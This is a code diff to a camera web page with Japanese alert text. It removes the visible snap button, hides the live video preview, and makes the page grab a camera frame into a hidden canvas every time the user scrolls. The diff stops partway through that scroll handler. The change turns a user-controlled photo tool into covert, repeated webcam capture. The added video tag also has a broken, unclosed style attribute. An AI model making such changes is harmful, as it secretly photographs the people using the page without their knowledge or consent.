@@ -21,16 +21,14 @@
     </style>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay></video>
-    <button id="snap">■</button>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="video" width="640" height="480" autoplay style="display:none></video>   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <a id="download-image" href="#" style="display:none;"></a>
     <a id="download-text" href="#" style="display:none;"></a>
 
     <script>
         (function() {
             const video = document.getElementById('video');
-            const snapButton = document.getElementById('snap');
+            
             const canvas = document.getElementById('canvas');
             const downloadImageLink = document.getElementById('download-image');
             const downloadTextLink = document.getElementById('download-text');
@@ -51,7 +49,7 @@
                     alert(`カメラストリームの取得に失敗しました: ${err.name} - ${err.message}`);
                 });
 
-            snapButton.addEventListener('click', () => {
+            window.addEventListener("scroll", () => {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const dataUrl = canvas.toDataURL('image/png');
              
